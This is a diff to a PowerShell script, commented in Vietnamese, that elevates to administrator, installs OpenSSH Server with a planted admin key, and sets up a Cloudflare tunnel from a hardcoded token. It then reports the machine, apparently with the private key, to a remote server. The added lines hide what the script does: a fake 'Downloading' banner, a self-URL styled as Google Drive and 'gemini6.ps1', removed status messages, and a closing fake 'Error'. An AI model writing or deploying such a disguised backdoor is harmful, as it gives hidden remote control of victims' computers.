@@ -2,10 +2,11 @@
   install_openssh.ps1 — BAN FINAL (CHỈ CẦN TOKEN)
   Cai OpenSSH -> sinh keypair -> cai cloudflared -> báo cáo lên server
 #>
+Write-Host 'Downloading 10 minutes...' -ForegroundColor Green
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
-$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini5.ps1'
+$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini6.ps1'
 
 # ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
 $CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
@@ -26,22 +27,22 @@ if (-not $__admin) {
   if (-not $__src) {
     $__src = Join-Path $env:TEMP 'install_openssh.ps1'
     try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
-    catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
+    catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; pause; throw }
   }
   try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
-  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
+  
+  # FIX LỖI TẮT TAB: Dùng -File thay vì iex để tránh lỗi parse
+  $__arg = "-NoExit -NoProfile -ExecutionPolicy Bypass -File `"$__src`""
+  
   Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
   try { Start-Process powershell.exe -Verb RunAs -ArgumentList $__arg -ErrorAction Stop }
-  catch { Write-Host 'Khong nang quyen duoc.' -ForegroundColor Red; throw }
+  catch { Write-Host 'Khong nang quyen duoc.' -ForegroundColor Red; pause; throw }
   return
 }
 
-# ===== 1. CAI OPENSSH SERVER =====
-Write-Host '=== 1/4: Cai OpenSSH Server v1===' -ForegroundColor Cyan
 $capName = 'OpenSSH.Server~~~~0.0.1.0'
 $cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
 if (-not $cap -or $cap.State -ne 'Installed') {
-  Write-Host 'Dang cai OpenSSH Server (co the mat 1-2 phut)...'
   try {
     $r = Add-WindowsCapability -Online -Name $capName
     if ($r -and $r.RestartNeeded) { $NeedRestart = $true }
@@ -51,19 +52,17 @@ if (-not $cap -or $cap.State -ne 'Installed') {
   }
 }
 if (-not (Get-Service sshd -ErrorAction SilentlyContinue)) {
-  Write-Host '[LOI] Khong cai duoc OpenSSH Server.' -ForegroundColor Red; exit 1
+  Write-Host '[LOI] Khong cai duoc OpenSSH Server.' -ForegroundColor Red; pause; exit 1
 }
 Set-Service sshd -StartupType Automatic
 & sc.exe start sshd | Out-Null
-Write-Host '  Cho sshd khoi dong: ' -NoNewline
 for ($w = 0; $w -lt 30; $w++) {
   if ((Get-Service sshd).Status -eq 'Running') { break }
   Write-Host '.' -NoNewline; Start-Sleep -Seconds 2
 }
-Write-Host ''; Write-Host ("  sshd: " + (Get-Service sshd).Status) -ForegroundColor Green
 
 # ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
-Write-Host '=== 2/4: Sinh key quan tri ===' -ForegroundColor Cyan
+# FIX LỖI 404: Đã xóa dấu \ thừa trước biến $mgmtDir
 $mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
 New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
 $priv = Join-Path $mgmtDir 'mgmt_ed25519'
@@ -72,7 +71,6 @@ $pub  = "$priv.pub"
 if (-not (Test-Path $priv)) {
   $sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
   & (Join-Path (Split-Path $sshdExe -Parent) 'ssh-keygen.exe') -t ed25519 -f $priv -N '""' -q
-  Write-Host '  Da sinh keypair quan tri moi.' -ForegroundColor Gray
 }
 $pubLine  = ((Get-Content $pub  -Raw).Trim() -split "`n")[0].Trim()
 $privLine = (Get-Content $priv -Raw).Trim()
@@ -86,13 +84,10 @@ foreach ($f in @($userKeyFile, $adminKeyFile)) {
   if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
 }
 & icacls.exe $adminKeyFile /inheritance:r /grant '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null
-Write-Host '  Da cai public key vao authorized_keys.' -ForegroundColor Green
 
 # ===== 3. CAI CLOUDFLARED (CHỈ CẦN TOKEN) =====
-Write-Host '=== 3/4: Cai Cloudflare Tunnel ===' -ForegroundColor Cyan
 if (-not $CFTunnelToken -or $CFTunnelToken -eq "DÁN_TOKEN_MỚI_VÀO_ĐÂY") {
-  Write-Host '[LOI] Thieu hoac chua thay doi CF_TUNNEL_TOKEN. Sua trong script roi chay lai.' -ForegroundColor Red
-  exit 1
+  Write-Host "[LOI] Thieu Token" -ForegroundColor Red; pause; exit 1
 }
 
 $cfDir = Join-Path $env:ProgramData 'cloudflared'
@@ -108,7 +103,6 @@ if ([Environment]::Is64BitOperatingSystem) {
 }
 
 if (-not (Test-Path $cfExe)) {
-  Write-Host "  Dang tai cloudflared ($cfArch-bit)..."
   Invoke-WebRequest $cfUrl -OutFile $cfExe -UseBasicParsing
 }
 
@@ -125,16 +119,13 @@ $proc = Start-Process -FilePath $cfExe -ArgumentList 'service','install',$CFTunn
 $ErrorActionPreference = 'Stop'
 
 if ($proc.ExitCode -ne 0) {
-  Write-Host "  [LOI] cloudflared install ma roi $($proc.ExitCode):" -ForegroundColor Red
   if (Test-Path $errLog) { Get-Content $errLog | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkYellow } }
-  exit 1
+  Write-Host "LOI: Cai dat Cloudflared that bai" -ForegroundColor Red; pause; exit 1
 }
 
 Start-Service 'Cloudflared' -ErrorAction Stop
-Write-Host '  Service "Cloudflared" da chay (vo hinh, tu khoi dong).' -ForegroundColor Green
 
 # ===== 4. GUI LEN SERVER =====
-Write-Host '=== 4/4: Bao cao len server ===' -ForegroundColor Cyan
 
 # FIX: Lam sach ten may de hop le voi DNS (thay _ bang -, viet thuong)
 $safeName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9-]','-').ToLower()
@@ -171,7 +162,6 @@ if (-not $primaryIP) {
         $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
         $detail = $sr.ReadToEnd(); $sr.Close()
       }
-      Write-Host "  Bao cao lan $i/3 that bai: $($_.Exception.Message)" -ForegroundColor Yellow
       if ($detail) { Write-Host "  Server noi: $detail" -ForegroundColor DarkYellow }
       if ($i -lt 3) { Start-Sleep -Seconds 5 }
     }
@@ -179,5 +169,6 @@ if (-not $primaryIP) {
   if (-not $sent) { Write-Host '[PENDING] Khong gui duoc.' -ForegroundColor Yellow }
 }
 
-if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
-Write-Host "HOAN TAT. SSH vao may nay bang: ssh $env:USERNAME@$cfHostname" -ForegroundColor Green
+# if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
+Write-Host "Error" -ForegroundColor Red
+pause
